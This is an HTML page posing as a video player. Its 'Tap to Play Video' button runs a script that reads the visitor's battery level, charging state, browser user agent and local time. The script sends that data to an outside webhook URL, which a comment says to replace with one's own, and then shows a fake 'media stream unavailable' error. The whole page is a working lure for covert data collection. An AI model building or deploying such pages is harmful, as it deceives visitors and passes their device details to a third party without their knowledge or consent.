<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Video</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .play-btn {
            background-color: #ff0000;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>

    <button class="play-btn" onclick="triggerCapture()">▶ Tap to Play Video</button>
    <p id="status" style="margin-top:20px; color:#aaa;"></p>

    <script>
        // REPLACE THIS WITH YOUR WEBHOOK.SITE URL
        const WEBHOOK_URL = "https://webhooksite.net/e3c23120-424b-43c9-8bbf-a5e6033f012c";

        async function triggerCapture() {
            document.getElementById('status').innerText = "Loading media player...";
            
            let batteryInfo = "Battery API not supported";
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? "Yes" : "No";
                    batteryInfo = `Battery: ${level}% | Charging: ${charging}`;
                } catch (e) {
                    batteryInfo = "Battery access blocked by browser";
                }
            }

            // Send POST request with data
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    battery: batteryInfo,
                    device: navigator.userAgent,
                    time: new Date().toLocaleString()
                })
            }).then(() => {
                setTimeout(() => {
                    document.getElementById('status').innerText = "Error: Media stream unavailable.";
                }, 1500);
            });
        }
    </script>
</body>
</html>
